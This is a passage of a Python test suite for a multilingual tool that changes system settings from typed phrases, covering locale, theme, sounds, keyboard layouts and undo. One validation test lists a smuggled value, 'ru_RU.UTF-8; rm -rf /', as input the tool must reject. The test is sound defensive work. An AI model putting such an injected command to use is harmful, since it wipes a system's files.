        self.assertTrue({r["file"]: r for r in policy.apply_all(self.ctx, journal)}["10-lock.json"]["ok"])
        self.assertEqual(env.read_text(), "DAI_LOCK_MAX_SECONDS=600\n")
        # Undo restores the previous limit, and then no limit.
        executor.undo_entry(journal.entries()[-1], self.ctx, journal)
        self.assertEqual(env.read_text(), "DAI_LOCK_MAX_SECONDS=300\n")
        executor.undo_entry(journal.entries()[0], self.ctx, journal)
        self.assertFalse(env.exists())

    def test_must_be_owned_by_root_on_a_real_system(self):
        from dai_tune import policy
        path = self.write("10-x.json", {"format": 1, "apply": ["block usb storage"]})
        real = Context(root=Path("/"), home=self.home, runner=self.runner)
        fake_stat = os.stat_result((0o100644, 0, 0, 1, 1000, 1000, 100, 0, 0, 0))
        with mock.patch.object(Path, "stat", return_value=fake_stat):
            self.assertEqual(policy._trusted(path, real), "is not owned by root")


class LanguageTests(TuneTestCase):
    """docs/I18N.md §9: the language of D.Ai, in each of the eight languages."""

    apply = ExecutorTests.apply

    SENTENCES = {"language russian": "ru", "שפה רוסית": "ru", "русский язык": "ru", "اللغة العربية": "ar",
                 "idioma español": "es", "langue française": "fr", "Sprache Deutsch": "de", "idioma português": "pt",
                 "interface language hebrew": "he", "שפת הממשק אנגלית": "en"}

    def test_each_language_asks_for_the_locale_and_the_session(self):
        for sentence, code in self.SENTENCES.items():
            result = parser.parse(sentence)
            self.assertEqual([(r.action, r.params) for r in result.requests],
                             [("system.locale", {"lang": code}), ("session.language", {"lang": code})], sentence)
        self.assertEqual(parser.parse("language russian french").requests, [])  # which one? not a guess

    def test_the_locale_is_generated_and_undone(self):
        gen = self.root / "etc/locale.gen"
        gen.parent.mkdir(parents=True, exist_ok=True)
        gen.write_text("# ru_RU.UTF-8 UTF-8\nhe_IL.UTF-8 UTF-8\n")
        entry, journal = self.apply("language russian")
        self.assertIn("ru_RU.UTF-8 UTF-8\n", gen.read_text())
        self.assertNotIn("# ru_RU", gen.read_text())
        self.assertIn(["locale-gen"], self.runner.calls)
        executor.undo_entry(entry, self.ctx, journal)
        self.assertEqual(gen.read_text(), "# ru_RU.UTF-8 UTF-8\nhe_IL.UTF-8 UTF-8\n")
        gen.write_text("he_IL.UTF-8 UTF-8\n")
        self.apply("language arabic")
        self.assertIn("ar_EG.UTF-8 UTF-8", gen.read_text())  # a missing line is added

    def test_the_session_file_is_private_and_exact(self):
        self.apply("שפה גרמנית", scope="user")
        env = self.home / ".config/dai/language.env"
        self.assertEqual(env.read_text(), "LANG=de_DE.UTF-8\nLANGUAGE=de:en\n")
        self.assertEqual(oct(env.stat().st_mode & 0o777), "0o600")

    def test_only_the_eight_languages(self):
        spec = catalog.CATALOG["session.language"]
        for bad in ("xx", "ru_RU.UTF-8; rm -rf /", "", None, 7):
            with self.assertRaises(catalog.ValidationError):
                spec.validate({"lang": bad}, self.ctx)
        with self.assertRaises(catalog.ValidationError):
            spec.validate({"lang": "ru", "extra": 1}, self.ctx)

    def test_theme_sentences(self):
        cases = {"light theme": "day", "ערכת נושא בהירה": "day", "dark mode": "night", "עיצוב כהה": "night",
                 "high contrast": "contrast", "ניגודיות גבוהה": "contrast", "тёмная тема": "night",
                 "modo claro": "day", "contraste élevé": "contrast", "dunkles Design": "night"}
        for sentence, theme in cases.items():
            result = parser.parse(sentence)
            self.assertEqual([(r.action, r.params) for r in result.requests],
                             [("appearance.theme", {"theme": theme})], sentence)
        self.assertNotIn("appearance.theme", [r.action for r in parser.parse("night light").requests])

    def test_sound_sentences(self):
        cases = {"turn off system sounds": "off", "mute sounds": "off", "השתק צלילי מערכת": "off", "בלי צלילים": "off",
                 "quiet sounds": "quiet", "צלילים שקטים": "quiet", "turn on sounds": "on", "הפעל צלילים": "on"}
        for sentence, level in cases.items():
            result = parser.parse(sentence)
            self.assertEqual([(r.action, r.params) for r in result.requests],
                             [("system.sounds", {"mode": level})], sentence)
        for other in ("mute the microphone", "turn off bluetooth", "light theme"):
            self.assertNotIn("system.sounds", [r.action for r in parser.parse(other).requests], other)

    def test_sounds_are_written_and_undone(self):
        path = self.home / ".config/dai/sounds"
        plan = self.plan("quiet sounds")
        self.assertTrue(plan.ok, plan.errors + plan.unknown)
        journal = executor.Journal.for_user(self.ctx)
        entry = executor.apply_steps(plan.scoped("user"), self.ctx, journal, actor="1000", scope="user")
        self.assertEqual(path.read_text(), "quiet\n")
        executor.undo_entry(entry, self.ctx, journal)
        self.assertFalse(path.exists())

    def test_theme_is_written_and_undone(self):
        theme = self.home / ".config/dai/theme"
        theme.parent.mkdir(parents=True)
        theme.write_text("contrast\n")
        plan = self.plan("light theme")
        self.assertTrue(plan.ok, plan.errors + plan.unknown)
        journal = executor.Journal.for_user(self.ctx)
        entry = executor.apply_steps(plan.scoped("user"), self.ctx, journal, actor="1000", scope="user")
        self.assertEqual(theme.read_text(), "day\n")
        executor.undo_entry(entry, self.ctx, journal)
        self.assertEqual(theme.read_text(), "contrast\n")
        with self.assertRaises(catalog.ValidationError):
            catalog.CATALOG["appearance.theme"].validate({"theme": "neon"}, self.ctx)

    def test_arabic_keyboard_is_the_real_xkb_name(self):
        result = parser.parse("keyboard english arabic portuguese")
        self.assertEqual(result.requests[0].params, {"layouts": ["us", "ara", "pt"]})
        spec = catalog.CATALOG["keyboard.layouts"]
        self.assertEqual(spec.validate({"layouts": ["ar", "us"]}, self.ctx), {"layouts": ["ara", "us"]})  # old name



class KeywordPackTests(unittest.TestCase):
    """docs/I18N.md §10: Tune in the six other languages, through data files (dai_tune/lang/*.json)."""

    CASES = [
     ("заблокируй флешки", "device.block"), ("открой порт 8080", "firewall.open_port"), ("включи автоматические обновления", "updates.auto"),
     ("заблокировать экран через 5 минут", "session.lock"), ("освободи место на диске", "system.clean"), ("отмени последнее обновление", "snapshots.undo_update"),
     ("режим экономии батареи", "power.profile"), ("установи vlc", "packages.install"), ("отключи блютуз и камеру", "device.block"),
     ("احظر الفلاشة", "device.block"), ("افتح المنفذ 8080", "firewall.open_port"), ("فعّل التحديثات التلقائية", "updates.auto"),
     ("اقفل الشاشة بعد 5 دقائق", "session.lock"), ("حرر مساحة القرص", "system.clean"), ("تراجع عن آخر تحديث", "snapshots.undo_update"),
     ("bloquear usb", "device.block"), ("abrir puerto 8080", "firewall.open_port"), ("activar actualizaciones automáticas", "updates.auto"),
     ("bloquear la pantalla después de 5 minutos", "session.lock"), ("liberar espacio en disco", "system.clean"), ("deshacer la última actualización", "snapshots.undo_update"),
     ("instalar vlc y gimp", "packages.install"), ("ahorro de batería", "power.profile"),
     ("bloquer les clés usb", "device.block"), ("ouvrir le port 8080", "firewall.open_port"), ("activer les mises à jour automatiques", "updates.auto"),
     ("verrouiller l'écran après 5 minutes", "session.lock"), ("libérer de l'espace disque", "system.clean"), ("annuler la dernière mise à jour", "snapshots.undo_update"),
     ("USB-Sticks sperren", "device.block"), ("Port 8080 öffnen", "firewall.open_port"), ("automatische Updates aktivieren", "updates.auto"),
     ("Bildschirm nach 5 Minuten sperren", "session.lock"), ("Speicherplatz freigeben", "system.clean"), ("letztes Update rückgängig machen", "snapshots.undo_update"),
     ("installiere vlc", "packages.install"), ("Energiesparmodus", "power.profile"),
     ("bloquear pendrive", "device.block"), ("abrir porta 8080", "firewall.open_port"), ("ativar atualizações automáticas", "updates.auto"),
     ("bloquear a tela após 5 minutos", "session.lock"), ("liberar espaço em disco", "system.clean"), ("desfazer a última atualização", "snapshots.undo_update"),
     ("block usb", "device.block"), ("חסום דיסק און קי", "device.block"), ("נעל מסך אחרי 5 דקות", "session.lock"),
     ("отключи звуки", "system.sounds"), ("أوقف الأصوات", "system.sounds"), ("sonidos suaves", "system.sounds"),
     ("couper les sons", "system.sounds"), ("Töne einschalten", "system.sounds"), ("ativar os sons", "system.sounds"),
    ]

    def test_each_language_reaches_the_same_actions(self):
        for text, action in self.CASES:
            result = parser.parse(text)
            self.assertIn(action, [r.action for r in result.requests], text)
            self.assertEqual(result.unknown, [], text)

    def test_hebrew_and_english_are_untouched(self):
        for lang in ("he", "en"):
            for example in parser.EXAMPLES[lang]:
                normalized = parser._normalize(example)
                self.assertEqual(parser.translate(normalized), normalized, example)

    def test_packs_are_data_in_the_expected_shape(self):
        directory = Path(parser.__file__).parent / "lang"
        codes = sorted(p.stem for p in directory.glob("*.json"))
        self.assertEqual(codes, ["ar", "de", "es", "fr", "pt", "ru"])
        for path in directory.glob("*.json"):
            data = json.loads(path.read_text(encoding="utf-8"))
            self.assertEqual((data["format"], data["lang"]), (1, path.stem))
            for foreign, english in data["phrases"].items():
                self.assertRegex(english, r"^[a-z0-9 .:'-]+$", f"{path.name}: {foreign}")

    def test_a_verb_carries_to_the_next_device_only(self):
        result = parser.parse("turn off bluetooth and camera")
        self.assertEqual([(r.action, r.params["kind"]) for r in result.requests],
                         [("device.block", "bluetooth"), ("device.block", "camera")])
        self.assertEqual(parser.parse("block usb and the camera please").unknown, ["the camera please"])  # no guess
